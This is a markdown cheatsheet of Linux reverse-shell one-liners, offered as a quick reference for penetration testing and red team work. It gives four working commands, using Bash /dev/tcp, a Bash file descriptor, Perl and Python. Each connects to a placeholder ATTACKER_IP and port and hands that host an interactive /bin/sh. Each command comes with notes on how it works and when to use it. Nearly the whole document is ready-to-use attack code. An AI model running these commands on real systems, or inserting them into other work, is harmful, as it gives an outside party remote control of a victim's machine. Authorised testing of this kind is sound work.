# Linux Reverse Shell Cheatsheet

A curated collection of common one-liner commands for obtaining a reverse shell from a Linux target. This document serves as a quick reference for penetration testing and red team operations.

Each command is presented with its method of operation and typical use case.

---

### 1. Bash via `/dev/tcp`

A simple and widely used method that leverages a built-in Bash feature for network communication.

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

### Method
Creates an interactive Bash shell (-i) and redirects its standard output (stdout) and standard error (stderr) to a TCP socket connected to the attacker's machine. Standard input (stdin) is also redirected, allowing for two-way communication.

### Use Case
Ideal for systems where bash is available and the /dev/tcp feature is enabled.

---

### 2. Bash via File Descriptor

A more robust and stable method for creating an interactive shell, also using `/dev/tcp`.

```bash
exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; cat <&5 | /bin/sh -i 2>&1 | tee >&5
```
### Method
Opens a read/write file descriptor (5) to the TCP socket. It then reads commands from this descriptor (cat <&5), pipes them to an interactive shell (/bin/sh -i), and uses tee to send the shell's output back to the attacker through the same descriptor.

### Use Case
Excellent for situations requiring a more stable interactive session than the simpler Bash method.

---

### 3. Perl
A classic and lightweight one-liner for systems where the Perl interpreter is installed.

```perl
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(ATTACKER_PORT,inet_aton("ATTACKER_IP")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Method
Uses the Socket module to establish a TCP connection. If successful, it duplicates the socket to act as the standard input, output, and error for a new interactive shell process (exec("/bin/sh -i")).

### Use Case
Very effective on older Linux systems or appliances where Perl is common.

---

### 4. Python
A modern, reliable method that works on any system with Python 2 or 3 installed.

```Python
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Method
Uses Python's standard libraries to create a TCP socket and connect to the attacker. It then uses os.dup2 to clone the socket's file descriptor, making it the standard input (0), standard output (1), and standard error (2) for the process. Finally, it spawns an interactive shell that inherits these new standard streams.

### Use Case
The most common and reliable method for modern Linux systems.
